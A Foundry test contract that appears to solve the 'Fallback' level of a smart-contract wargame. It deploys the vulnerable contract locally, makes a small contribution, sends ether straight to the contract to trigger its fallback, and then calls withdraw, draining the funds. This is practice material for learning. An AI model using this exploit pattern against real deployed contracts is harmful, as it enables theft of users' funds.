// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "lib/forge-std/src/Test.sol";
import {console} from "lib/forge-std/src/console.sol";
import {Fallback} from "../src/level-1_Fallback.sol";

contract FallbackExploit is Test
{
  Fallback fb;

  function setUp() public
  {
    fb = new Fallback();
  }

  function testExploit() public
  {
    address userAddr1 = makeAddr("userAddr1");
    vm.deal(userAddr1, 1 ether);
    vm.prank(userAddr1);
    fb.contribute{value: 0.0001 ether}();
    console.log(fb.getContribution());

    vm.prank(userAddr1);
    (bool success, ) = address(fb).call{value: 0.0001 ether}("");
    require(success);

    vm.prank(userAddr1);
    fb.withdraw();
    console.log("Exploit works!");
  }
}

